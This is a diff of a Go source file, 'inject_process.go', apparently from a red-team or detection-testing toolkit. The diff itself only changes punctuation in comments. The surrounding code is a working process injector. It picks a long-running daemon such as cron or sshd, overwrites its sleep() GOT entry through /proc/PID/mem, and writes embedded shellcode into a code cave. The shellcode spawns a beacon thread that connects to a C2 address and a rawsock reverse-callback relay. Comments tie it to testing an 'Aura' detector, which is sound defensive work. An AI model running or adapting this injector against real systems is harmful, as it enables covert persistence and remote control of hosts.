@@ -1,10 +1,10 @@
 package ttp
 
-// inject_process.go — TTP 11: process injection without ptrace (GOT overwrite)
+// inject_process.go   TTP 11: process injection without ptrace (GOT overwrite)
 //
 // Technique:
 //   1. Find a long-running daemon (cron, rsyslogd, sshd) as injection target
-//   2. Find the target's GOT entry for sleep() — in main binary range (0x55...)
+//   2. Find the target's GOT entry for sleep()   in main binary range (0x55...)
 //      Read 8 bytes: this is the resolved libc sleep() virtual address
 //   3. Locate a code cave (≥0x220 bytes of 0x00/0xCC/0x90) in target's .text
 //   4. Write the beacon shellcode blob to the cave via /proc/PID/mem
@@ -18,14 +18,14 @@ package ttp
 //   - hook_entry spawns a beacon thread via clone(CLONE_VM|CLONE_THREAD)
 //   - beacon thread loops: TCP connect → 0xBA byte → close → nanosleep(30s)
 //   - .trampoline does jmp [rel trampoline_target] → indirect jump to real sleep()
-//   - agent caller then calls os.Exit(0) — process disappears
+//   - agent caller then calls os.Exit(0)   process disappears
 //
 // Why GOT overwrite instead of code patch:
 //   - Patching libc sleep() directly at 0x7f... requires JMP from 0x7f... to cave
-//     at 0x55...: ~37TB delta — far exceeds ±2GB rel32 limit → cron crashes.
+//     at 0x55...: ~37TB delta   far exceeds ±2GB rel32 limit → cron crashes.
 //   - GOT entry is in the main binary range (0x55...), same as code cave.
 //   - jmp [rel trampoline_target] in shellcode is an indirect 6-byte jump
-//     (FF 25 <rel32>) that loads a 64-bit pointer — no distance limit.
+//     (FF 25 <rel32>) that loads a 64-bit pointer   no distance limit.
 //
 // Detection surface for Aura v5:
 //   - openat("/proc/PID/mem", O_RDWR) from a non-child process
@@ -48,7 +48,7 @@ import (
 )
 
 // InjectStub is the pre-compiled shellcode blob (stub.bin built from inject/stub.asm).
-// Embedded at build time — the Makefile copies inject/stub.bin to inject_stub.bin here.
+// Embedded at build time   the Makefile copies inject/stub.bin to inject_stub.bin here.
 //
 //go:embed inject_stub.bin
 var InjectStub []byte
@@ -59,9 +59,9 @@ const (
 	blobOffC2IP          = 0x008
 	blobOffC2Port        = 0x00C
 	blobOffThreadStack   = 0x010
-	blobOffTrampTarget   = 0x018 // resolved sleep() VA — loaded by jmp [rel trampoline_target]
+	blobOffTrampTarget   = 0x018 // resolved sleep() VA   loaded by jmp [rel trampoline_target]
 	blobOffMagicKey      = 0x020 // 8-byte key for rawsock magic packet validation (Fase 3)
-	blobOffRawsockCBIP   = 0x028 // relay direct IPv4 NBO — rawsock reverse callback IP
+	blobOffRawsockCBIP   = 0x028 // relay direct IPv4 NBO   rawsock reverse callback IP
 	blobOffRawsockCBPort = 0x02C // rawsock callback port NBO (typically 9443)
 	blobOffHookEntry     = 0x090 // code cave entry point
 	blobMinSize          = 0x300 // sanity lower-bound: actual stub is 992 bytes
@@ -71,7 +71,7 @@ const (
 // into a target daemon via /proc/PID/mem (GOT overwrite, no ptrace).
 //
 // c2Addr must be "host:port" (resolved IPv4, for the periodic TCP beacon).
-// rawsockCBAddr must be "host:port" (relay direct IPv4:port) — baked into blob
+// rawsockCBAddr must be "host:port" (relay direct IPv4:port)   baked into blob
 // so the rawsock thread connects here on trigger, regardless of magic packet source.
 // This enables I-01 model: server local, magic packet sent to target public IP,
 // rawsock callback to relay:9443 → SSH tunnel → server local.
@@ -117,7 +117,7 @@ func InjectProcess(c2Addr string, magicKey [8]byte, rawsockCBAddr string) (strin
 		}
 	}
 
-	// R-12: read ptrace_scope early — used for error context if memWrite fails.
+	// R-12: read ptrace_scope early   used for error context if memWrite fails.
 	ptraceScope := 0
 	if data, err := os.ReadFile("/proc/sys/kernel/yama/ptrace_scope"); err == nil {
 		fmt.Sscanf(strings.TrimSpace(string(data)), "%d", &ptraceScope)
@@ -140,8 +140,8 @@ func InjectProcess(c2Addr string, magicKey [8]byte, rawsockCBAddr string) (strin
 	}
 	// Sanity check: resolvedSleepVA must be in the upper user-space range where
 	// shared libraries live (0x700000000000+). Values below that are either:
-	//   (a) PLT stubs (lazy binding not triggered) — GOT→hook→PLT→GOT loop risk
-	//   (b) Our own previous hook_entry in the code cave — re-inject scenario
+	//   (a) PLT stubs (lazy binding not triggered)   GOT→hook→PLT→GOT loop risk
+	//   (b) Our own previous hook_entry in the code cave   re-inject scenario
 	//
 	// Distinguish (a) from (b): try to read trampoline_target from the presumed
 	// data header at (resolvedSleepVA - blobOffHookEntry + blobOffTrampTarget).
@@ -176,17 +176,17 @@ func InjectProcess(c2Addr string, magicKey [8]byte, rawsockCBAddr string) (strin
 	blob := buildBlob(c2IPu32, c2PortBE, resolvedSleepVA, magicKey, rawsockIPu32, rawsockPortBE)
 
 	// 5. Write blob to code cave:
-	//    First call process_vm_writev — generates the Aura detection signal.
+	//    First call process_vm_writev   generates the Aura detection signal.
 	//    It may fail on r-xp pages (no writable mapping), that is expected.
 	//    Then confirm write via /proc/PID/mem (FOLL_FORCE bypasses page perms).
 	if err := vmWritev(pid, caveAddr, blob); err != nil {
-		_ = err // expected failure on RX page — fall through
+		_ = err // expected failure on RX page   fall through
 	}
 
 	// R-12: ptrace_scope=3 (Yama strict mode) blocks /proc/PID/mem write even as root.
-	// vmWritev above already generated the Aura detection signal — fail cleanly.
+	// vmWritev above already generated the Aura detection signal   fail cleanly.
 	if ptraceScope == 3 {
-		return "", fmt.Errorf("injection blocked: ptrace_scope=3 (Yama strict mode — /proc/PID/mem denied)")
+		return "", fmt.Errorf("injection blocked: ptrace_scope=3 (Yama strict mode   /proc/PID/mem denied)")
 	}
 
 	if err := memWrite(pid, caveAddr, blob); err != nil {
@@ -210,7 +210,7 @@ func InjectProcess(c2Addr string, magicKey [8]byte, rawsockCBAddr string) (strin
 	// R-10: warn if rawsock thread will fail due to missing CAP_NET_RAW.
 	warnSuffix := ""
 	if !hasCapNetRaw(pid) {
-		warnSuffix = " [WARN: no CAP_NET_RAW — rawsock EPERM]"
+		warnSuffix = " [WARN: no CAP_NET_RAW   rawsock EPERM]"
 	}
 
 	return fmt.Sprintf(
@@ -338,10 +338,10 @@ func findGOTEntry(pid int, symName string) (gotAddr uint64, resolvedVA uint64, e
 // R-09: scores every matching process and returns the highest-scoring one.
 // Scoring:
 //
-//	+40  CAP_NET_RAW present  — rawsock listener will succeed (Fase 3)
-//	+20  NoNewPrivs=0         — process is not privilege-locked
-//	+10  RELRO != full        — no CoW write required for GOT overwrite
-//	 +5  early starttime      — stable process running since early boot
+//	+40  CAP_NET_RAW present    rawsock listener will succeed (Fase 3)
+//	+20  NoNewPrivs=0           process is not privilege-locked
+//	+10  RELRO != full          no CoW write required for GOT overwrite
+//	 +5  early starttime        stable process running since early boot
 func findTargetPID(candidates []string) (int, string, error) {
 	candidateSet := make(map[string]bool, len(candidates))
 	for _, c := range candidates {
@@ -395,7 +395,7 @@ func findTargetPID(candidates []string) (int, string, error) {
 }
 
 // scoreTargetProcess computes an injection desirability score for a process (R-09).
-// Called for every candidate — reads /proc files directly to avoid extra round-trips.
+// Called for every candidate   reads /proc files directly to avoid extra round-trips.
 func scoreTargetProcess(pid int) int {
 	score := 0
 	if hasCapNetRaw(pid) {
@@ -445,7 +445,7 @@ func readStarttime(pid int) uint64 {
 		return 0
 	}
 	// /proc/PID/stat format: "pid (comm) state ppid ..."
-	// comm can contain spaces — find last ')' to skip past it.
+	// comm can contain spaces   find last ')' to skip past it.
 	raw := string(data)
 	rp := strings.LastIndex(raw, ")")
 	if rp < 0 {
@@ -499,8 +499,8 @@ func parseMaps(pid int) ([]mapping, error) {
 // findCodeCave scans the target's r-xp .text mapping for a run of ≥size zero/NOP/INT3 bytes.
 //
 // Search order:
-//  1. Main executable .text (preferred — no shared-page impact).
-//  2. libc .text fallback — only when main binary .text is too small (e.g. Debian 12 cron 22KB).
+//  1. Main executable .text (preferred   no shared-page impact).
+//  2. libc .text fallback   only when main binary .text is too small (e.g. Debian 12 cron 22KB).
 //     Write via /proc/PID/mem triggers CoW, isolating the modification to this process.
 //
 // Excluded: anonymous mappings, kernel pseudo-mappings ([vdso], [vvar], [stack], etc.).
@@ -533,7 +533,7 @@ func findCodeCave(pid, size int) (uint64, error) {
 			n, err := f.Read(buf[total:])
 			total += n
 			if err != nil {
-				break // partial read — scan what we have
+				break // partial read   scan what we have
 			}
 		}
 		if total < size {
@@ -585,7 +585,7 @@ func findCodeCave(pid, size int) (uint64, error) {
 		}
 	}
 
-	// Pass 2: libc .text (preferred shared lib — CoW via FOLL_FORCE isolates write)
+	// Pass 2: libc .text (preferred shared lib   CoW via FOLL_FORCE isolates write)
 	for _, m := range maps {
 		if !isLibc(m) {
 			continue
@@ -649,7 +649,7 @@ func memWrite(pid int, addr uint64, data []byte) error {
 
 // vmWritev calls process_vm_writev(pid, local_iov, 1, remote_iov, 1, 0).
 // This is the "noisy" write that generates the Aura detection signal (SYS 311).
-// May fail on non-writable pages — caller falls back to memWrite.
+// May fail on non-writable pages   caller falls back to memWrite.
 func vmWritev(pid int, remoteAddr uint64, data []byte) error {
 	type iovec struct {
 		base uintptr
